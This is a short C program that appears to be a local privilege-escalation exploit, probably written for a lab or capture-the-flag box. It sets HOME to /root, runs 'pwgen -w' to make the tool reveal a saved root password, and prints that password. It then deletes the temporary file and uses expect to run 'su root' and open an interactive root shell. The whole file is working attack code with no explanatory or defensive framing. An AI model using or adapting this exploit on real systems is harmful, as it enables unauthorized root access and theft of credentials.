#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

int main() {
    FILE *file, *savedPasswordFile;

    char passwd[9];
    char filecontent[2048];
    char colon = ':'; 
    char character; 
    char command[2048];
    int i; 
    // Set the HOME environment variable to /root
    setenv("HOME", "/root", 1);
    system("pwgen -w > savedpwdforroot.txt");

    // Open the file in read mode
    savedPasswordFile = fopen("savedpwdforroot.txt", "r");

    if (savedPasswordFile == NULL) {
        perror("Error opening file");
        return 1;
    }


    while (fscanf(savedPasswordFile, "%c", &character) == 1) {
        if (character == colon){
            // get rid of the space 
            fscanf(savedPasswordFile, "%c", &character); 
            
            for(i=0; i<8; i++){
                // get the passwod which is 8 characters
                fscanf(savedPasswordFile, "%c", &character); 
                
                passwd[i] = character; 

            }
            passwd[8] = '\0';
            break; 
        }   
    }
    printf("%s \n", passwd); 
    fclose(savedPasswordFile);
    remove("savedpwdforroot.txt"); 

   
    sprintf(command, "expect -c 'spawn su root; expect \"Password:\"; send \"%s\\r\"; interact'", passwd); 
    system(command);
    return 0;
}
